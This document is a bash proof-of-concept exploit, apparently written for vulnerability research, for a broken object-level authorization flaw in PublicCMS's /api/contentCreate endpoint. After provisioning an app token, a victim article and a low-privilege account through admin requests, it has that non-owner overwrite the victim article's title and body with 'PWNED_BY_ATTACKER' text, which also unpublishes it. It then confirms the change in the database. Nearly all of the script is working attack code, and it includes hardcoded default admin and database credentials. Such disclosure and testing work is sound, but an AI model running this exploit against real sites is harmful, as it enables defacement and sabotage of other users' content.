#!/usr/bin/env bash
# VULN-007 — Cross-user content tampering / unpublish via /api/contentCreate update branch
#
# ContentCreateDirective pins the owner on CREATE but, on UPDATE, authorizes only on
# tenancy (siteId) — it omits the object-level owner check (oldEntity.getUserId()==user.getId())
# that the web content-edit path enforces. So any token holder can overwrite ANY content in the
# site, including another user's / an admin's. Also, `status` is not in ignoreProperties, so each
# update resets status to PEND(2) => a currently-published article is unpublished.
#
# Setup (via admin): provision an app authorized for contentCreate + issue an app token; create a
# published VICTIM article owned by the admin; create a low-priv ATTACKER user. Then the attacker
# (user token from /api/login) updates the victim's content.
#
# CONFIRMED when the attacker (not the owner) changes the victim article's title AND its status
# drops from NORMAL(1) to PEND(2).
#
# DESTRUCTIVE (modifies content). All target objects are created by this script (random suffix).
set -u
BASE_URL="${BASE_URL:-http://localhost:20000}"
VHOST="${VHOST:-site2.dev.publiccms.com}"
ADMIN_USER="${ADMIN_USER:-admin}"; ADMIN_PASS="${ADMIN_PASS:-admin}"
CATEGORY_ID="${CATEGORY_ID:-14}"; MODEL_ID="${MODEL_ID:-article}"
MYSQL_CONTAINER="${MYSQL_CONTAINER:-cvehunt_PublicCMS_mysql}"
DBQ(){ docker exec "$MYSQL_CONTAINER" mysql -uroot -pRootPass2026 publiccms -N -e "$1" 2>/dev/null | tr -d '\r'; }
OUT="$(cd "$(dirname "$0")" && pwd)"
S="$(tr -dc 'a-z0-9' </dev/urandom | head -c 8)"

echo "[INFO] VULN-007: cross-user content tamper/unpublish via /api/contentCreate update branch"

AC=$(curl -s -D - -o /dev/null -H "Host: $VHOST" --data "username=${ADMIN_USER}&password=${ADMIN_PASS}" \
     "$BASE_URL/admin/login" | grep -i 'set-cookie: PUBLICCMS_ADMIN' | cut -d= -f2 | cut -d';' -f1); ACSRF="${AC#*_}"
[ -z "$AC" ] && { echo "[FAIL] no admin session"; exit 1; }

echo "[SETUP] provision app (authorizedApis=contentCreate) + issue token"
curl -s -o /dev/null -H "Host: $VHOST" -b "PUBLICCMS_ADMIN=$AC" --data-urlencode "_csrf=$ACSRF" \
  --data-urlencode "name=xapp_$S" --data-urlencode "channel=web" --data-urlencode "appKey=key_$S" \
  --data-urlencode "appSecret=secret_$S" --data-urlencode "apis=contentCreate" "$BASE_URL/admin/sysApp/save"
APPID=$(DBQ "SELECT id FROM sys_app WHERE app_key='key_$S';")
curl -s -o /dev/null -H "Host: $VHOST" -b "PUBLICCMS_ADMIN=$AC" --data-urlencode "_csrf=$ACSRF" \
  --data-urlencode "id=$APPID" "$BASE_URL/admin/sysAppToken/issue"
APPTOKEN=$(DBQ "SELECT auth_token FROM sys_app_token WHERE app_id=$APPID ORDER BY create_date DESC LIMIT 1;")
[ -z "$APPTOKEN" ] && { echo "[FAIL] app token not issued"; exit 1; }

echo "[SETUP] create + publish VICTIM article (owned by admin) and low-priv ATTACKER"
curl -s -o /dev/null -H "Host: $VHOST" -b "PUBLICCMS_ADMIN=$AC" --data-urlencode "_csrf=$ACSRF" \
  --data-urlencode "categoryId=$CATEGORY_ID" --data-urlencode "modelId=$MODEL_ID" \
  --data-urlencode "title=VICTIM_ARTICLE_$S" --data-urlencode "text=Original body $S" --data-urlencode "checked=true" \
  "$BASE_URL/admin/cmsContent/save"
CID=$(DBQ "SELECT id FROM cms_content WHERE title='VICTIM_ARTICLE_$S';")
curl -s -o /dev/null -H "Host: $VHOST" -b "PUBLICCMS_ADMIN=$AC" --data-urlencode "_csrf=$ACSRF" --data-urlencode "id=$CID" "$BASE_URL/admin/cmsContent/check"
OWNER=$(DBQ "SELECT user_id FROM cms_content WHERE id=$CID;"); PRE_STATUS=$(DBQ "SELECT status FROM cms_content WHERE id=$CID;")
curl -s -o /dev/null -H "Host: $VHOST" -b "PUBLICCMS_ADMIN=$AC" --data-urlencode "_csrf=$ACSRF" \
  --data-urlencode "name=attacker_$S" --data-urlencode "nickname=attacker_$S" \
  --data-urlencode "password=Passw0rd!23" --data-urlencode "repassword=Passw0rd!23" --data-urlencode "contentPermissions=0" "$BASE_URL/admin/sysUser/save"
AID=$(DBQ "SELECT id FROM sys_user WHERE name='attacker_$S';")
SHA=$(python3 -c "import hashlib;print(hashlib.sha512(b'Passw0rd!23').hexdigest())")
ATOK=$(curl -s -H "Host: $VHOST" "$BASE_URL/api/login?username=attacker_$S&password=$SHA&encoding=sha512&channel=web" | python3 -c "import sys,json;print(json.load(sys.stdin).get('authToken',''))")
echo "[SETUP] victim content id=$CID owner=$OWNER status(pre)=$PRE_STATUS ; attacker id=$AID (owner!=attacker: $([ "$OWNER" != "$AID" ] && echo yes || echo no))"

echo "[STEP] attacker updates victim content via /api/contentCreate (no owner check)"
RESP=$(curl -s -H "Host: $VHOST" -H "appToken: $APPTOKEN" -H "authToken: $ATOK" -H "authUserId: $AID" \
  "$BASE_URL/api/contentCreate?id=$CID&categoryId=$CATEGORY_ID&modelId=$MODEL_ID&title=PWNED_BY_ATTACKER_$S&text=defaced_$S")
echo "$RESP" > "$OUT/response.txt"
POST_TITLE=$(DBQ "SELECT title FROM cms_content WHERE id=$CID;"); POST_STATUS=$(DBQ "SELECT status FROM cms_content WHERE id=$CID;"); POST_OWNER=$(DBQ "SELECT user_id FROM cms_content WHERE id=$CID;")
DBQ "SELECT id,user_id,title,status FROM cms_content WHERE id=$CID;" > "$OUT/evidence/content_after.txt"
echo "[INFO] api response: $RESP"
echo "[INFO] after attack: title='$POST_TITLE' status=$POST_STATUS owner=$POST_OWNER"

if [ "$POST_TITLE" = "PWNED_BY_ATTACKER_$S" ] && [ "$OWNER" != "$AID" ] && [ "$PRE_STATUS" = "1" ] && [ "$POST_STATUS" = "2" ]; then
  echo "[OK] exploit confirmed — non-owner (id=$AID) overwrote content owned by id=$OWNER and unpublished it (status 1->2)"
  exit 0
else
  echo "[FAIL] cross-user tamper/unpublish not fully observed"; exit 1
fi
# cleanup hint: DELETE cms_content WHERE title LIKE 'PWNED_BY_ATTACKER_%'; sys_app/sys_app_token/sys_user for this suffix.
